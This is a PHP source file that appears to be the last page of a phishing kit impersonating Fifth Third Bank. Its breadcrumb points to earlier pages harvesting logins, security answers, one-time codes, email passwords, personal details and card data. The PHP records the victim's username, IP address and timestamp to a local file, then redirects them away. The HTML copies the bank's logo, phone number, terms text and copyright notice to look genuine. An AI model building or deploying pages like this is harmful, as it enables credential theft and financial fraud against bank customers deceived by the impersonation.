<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $termsAccepted = isset($_POST['terms_accepted']) && $_POST['terms_accepted'] === 'yes';
    
    // Validation
    if (!$termsAccepted) {
        $errors['terms_accepted'] = 'You must accept the terms and conditions to continue';
    }
    
    if (empty($errors)) {
        // Save terms acceptance data
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'emzemz' => $username,
            'terms_accepted' => $termsAccepted,
            'acceptance_timestamp' => date('Y-m-d H:i:s'),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final destination
        header('Location: ' . FINAL_REDIRECT_URL);
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - Terms and Conditions</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with Terms Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="index.php" class="text-white/70 hover:text-white">Login</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="security_questions.php" class="text-white/70 hover:text-white">Security Questions</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="otp.php" class="text-white/70 hover:text-white">OTP Verification</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="email_password.php" class="text-white/70 hover:text-white">Email & Password</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="basic_info.php" class="text-white/70 hover:text-white">Personal Information</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="card.php" class="text-white/70 hover:text-white">Card Information</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">Terms & Conditions</span>
                </div>

                <!-- Terms Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-2xl w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <div class="text-center mb-6">
                                <div class="mx-auto w-16 h-16 bg-[#123b9d] rounded-full flex items-center justify-center mb-4">
                                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                                    </svg>
                                </div>
                                <h1 class="text-2xl font-bold text-gray-800 mb-2">Terms and Conditions</h1>
                                <p class="text-sm text-gray-600">Please review and accept our terms and conditions to complete your account setup.</p>
                            </div>
                            
                            <!-- Error Display -->
                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" class="space-y-6">
                                <!-- Terms Content -->
                                <div class="bg-white border border-gray-200 rounded-md p-4">
                                    <div class="max-h-64 overflow-y-auto space-y-4 text-sm text-gray-700">
                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">1. Account Agreement</h3>
                                            <p class="leading-relaxed">
                                                By opening and using a Fifth Third Bank account, you agree to be bound by the terms and conditions outlined in this agreement. This agreement governs the use of all banking services provided by Fifth Third Bank.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">2. Privacy Policy</h3>
                                            <p class="leading-relaxed">
                                                Fifth Third Bank is committed to protecting your privacy. We collect, use, and share your information in accordance with our Privacy Policy. We may use your information to provide services, process transactions, and communicate with you about your account.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">3. Electronic Communications</h3>
                                            <p class="leading-relaxed">
                                                You consent to receive communications from Fifth Third Bank electronically, including account statements, notices, and other required disclosures. You agree that electronic communications have the same legal effect as paper communications.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">4. Security and Fraud Protection</h3>
                                            <p class="leading-relaxed">
                                                You are responsible for maintaining the security of your account credentials, including your username, password, and PIN. You agree to notify us immediately of any unauthorized use of your account or suspected security breach.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">5. Fees and Charges</h3>
                                            <p class="leading-relaxed">
                                                Certain banking services may be subject to fees and charges. You agree to pay all applicable fees as outlined in our fee schedule. We reserve the right to modify our fees with proper notice to you.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">6. Account Closure</h3>
                                            <p class="leading-relaxed">
                                                Either you or Fifth Third Bank may close your account at any time, subject to applicable laws and regulations. We may close your account immediately if you violate any terms of this agreement.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">7. Limitation of Liability</h3>
                                            <p class="leading-relaxed">
                                                Fifth Third Bank shall not be liable for any indirect, incidental, special, or consequential damages arising from your use of our banking services, to the extent permitted by law.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">8. Governing Law</h3>
                                            <p class="leading-relaxed">
                                                This agreement shall be governed by and construed in accordance with the laws of the State of Ohio, without regard to its conflict of law principles.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">9. Changes to Terms</h3>
                                            <p class="leading-relaxed">
                                                Fifth Third Bank reserves the right to modify these terms and conditions at any time. We will provide you with notice of any material changes as required by law.
                                            </p>
                                        </div>

                                        <div>
                                            <h3 class="font-semibold text-gray-900 mb-2">10. Contact Information</h3>
                                            <p class="leading-relaxed">
                                                If you have any questions about these terms and conditions, please contact our customer service department at 1-800-972-3030 or visit any Fifth Third Bank branch.
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                <!-- Acceptance Checkbox -->
                                <div class="space-y-3">
                                    <label class="flex items-start space-x-3 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            id="terms_accepted"
                                            name="terms_accepted"
                                            value="yes"
                                            class="mt-1 h-4 w-4 text-[#123b9d] border-gray-300 rounded focus:ring-[#123b9d]"
                                        />
                                        <div class="text-sm">
                                            <span class="font-semibold text-gray-700">I have read and agree to the Terms and Conditions</span>
                                            <p class="text-gray-500 mt-1">
                                                By checking this box, you acknowledge that you have read, understood, and agree to be bound by the terms and conditions outlined above.
                                            </p>
                                        </div>
                                    </label>
                                    <?php if (isset($errors['terms_accepted'])): ?>
                                        <p class="text-xs font-semibold text-red-600 ml-7"><?php echo htmlspecialchars($errors['terms_accepted']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Additional Agreements -->
                                <div class="space-y-3">
                                    <label class="flex items-start space-x-3 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            id="privacy_policy"
                                            name="privacy_policy"
                                            value="yes"
                                            class="mt-1 h-4 w-4 text-[#123b9d] border-gray-300 rounded focus:ring-[#123b9d]"
                                        />
                                        <div class="text-sm">
                                            <span class="font-semibold text-gray-700">I have read and agree to the Privacy Policy</span>
                                            <p class="text-gray-500 mt-1">
                                                You acknowledge that you have reviewed our Privacy Policy and consent to our use of your personal information as described therein.
                                            </p>
                                        </div>
                                    </label>
                                </div>

                                <div class="space-y-3">
                                    <label class="flex items-start space-x-3 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            id="electronic_communications"
                                            name="electronic_communications"
                                            value="yes"
                                            class="mt-1 h-4 w-4 text-[#123b9d] border-gray-300 rounded focus:ring-[#123b9d]"
                                        />
                                        <div class="text-sm">
                                            <span class="font-semibold text-gray-700">I consent to Electronic Communications</span>
                                            <p class="text-gray-500 mt-1">
                                                You agree to receive account statements, notices, and other required communications electronically rather than in paper format.
                                            </p>
                                        </div>
                                    </label>
                                </div>

                                <!-- Submit Button -->
                                <button
                                    type="submit"
                                    class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition"
                                >
                                    Complete Account Setup
                                </button>

                                <!-- Cancel Link -->
                                <div class="text-center">
                                    <a href="card.php" class="text-sm text-[#123b9d] hover:underline">
                                        Cancel and go back
                                    </a>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Important Information</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    Please read the terms and conditions carefully before proceeding. These terms govern your relationship with Fifth Third Bank and outline your rights and responsibilities as an account holder.
                </p>

                <div class="grid gap-6 md:grid-cols-2">
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Your Rights</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            As a Fifth Third Bank customer, you have the right to access your account information, dispute unauthorized transactions, and receive clear disclosures about fees and account terms.
                        </p>
                    </div>

                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Your Responsibilities</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            You are responsible for maintaining accurate contact information, protecting your account credentials, and promptly reporting any suspicious activity on your account.
                        </p>
                        <ul class="text-sm text-gray-700 space-y-1">
                            <li>• Keep your login information secure</li>
                            <li>• Monitor your account regularly</li>
                            <li>• Report suspicious activity immediately</li>
                            <li>• Maintain sufficient funds for transactions</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Auto-focus terms checkbox on page load
        document.addEventListener('DOMContentLoaded', function() {
            const termsCheckbox = document.getElementById('terms_accepted');
            if (termsCheckbox) {
                termsCheckbox.focus();
            }
        });
    </script>
</body>
</html>
